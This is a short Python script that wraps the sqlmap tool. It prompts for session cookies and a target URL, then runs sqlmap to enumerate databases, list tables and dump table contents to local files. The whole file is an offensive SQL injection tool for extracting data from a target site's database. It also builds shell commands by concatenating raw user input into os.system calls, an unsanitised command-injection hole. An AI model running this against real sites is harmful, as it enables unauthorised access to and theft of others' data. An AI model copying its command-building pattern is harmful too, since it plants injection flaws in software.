#Injection class with manual entry before use of recursion/parsing
import os

#This is a class to run the various injection commands
class Injection():

	def __init__(self):
		self.cookies = raw_input("Enter your cookies: ")
		self.url = raw_input("Enter your target URL: ")
		self.dbs = None
		self.tbl = None
	
	#Method to get list of databases
	def dbsInject(self):
		mycmd = "sqlmap --cookie=\""+self.cookies+"\" -u \""+self.url+"\" --dbs"
		
		#Run command and output to file
		mycmd = mycmd+" | tee dbsList.txt"
		os.system(mycmd)
	
	#Method to get list of tables in database
	def tblInject(self):
		#Will be automated and recursive 
		self.dbs = raw_input("Enter the  databse name: ")
	
		mycmd = "sqlmap --cookie=\""+self.cookies+"\" -u \""+self.url+"\" --tables -D " + self.dbs
		
		#Run commnad and output to file
		mycmd = mycmd+" | tee tableList.txt"
		os.system(mycmd)

	#Method to dump info from tables
	def dumpInject(self):
		#Will be automated and recursvie
		self.tbl = raw_input("Enter the table name: ")

		mycmd = "sqlmap --cookie=\""+self.cookies+"\" -u \""+self.url+"\" --dump -D "+self.dbs+" -T "+self.tbl
		
		#Run command and put output in file
		mycmd = mycmd+" | tee dumpFile.txt"
		os.system(mycmd)
